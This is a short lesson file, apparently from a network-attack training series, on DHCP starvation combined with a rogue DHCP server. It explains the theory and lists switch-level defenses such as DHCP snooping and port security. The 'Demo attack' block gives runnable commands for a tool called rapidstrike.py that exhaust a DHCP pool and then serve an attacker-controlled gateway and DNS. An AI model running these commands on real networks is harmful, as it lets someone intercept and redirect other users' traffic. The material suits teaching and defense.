# 05 — DHCP starvation + rogue server (`dhcp-starve`, `dhcp`)

**Theory.** DHCP DORA (RFC 2131): the client takes the first valid OFFER with no
server authentication (A2). OFFER carries gateway (opt 3) + DNS (opt 6), so the
server controls next-hop and naming. Starvation drains the legit pool with many
MACs so the rogue wins the race.

**Demo attack.**
```bash
sudo python3 rapidstrike.py dhcp-starve -i eth0 --workers 16 &
sleep 60
sudo python3 rapidstrike.py dhcp -i eth0 --pool 192.168.1.150-192.168.1.200 --gateway 192.168.1.50 --dns 192.168.1.50 --server-ip 192.168.1.50
# success: `ipconfig / dhclient -v` receives attacker gateway
```

**Defense.** Same Snooping trust as file 01 — OFFERs only from trusted uplinks:
Cisco `ip dhcp snooping trust` on DHCP uplinks; Juniper `dhcp-security ... trusted`.
Plus Port Security rate limits vs starvation. Detection: OFFER/ACK drops on
untrusted, sudden pool drain, many MACs per port.
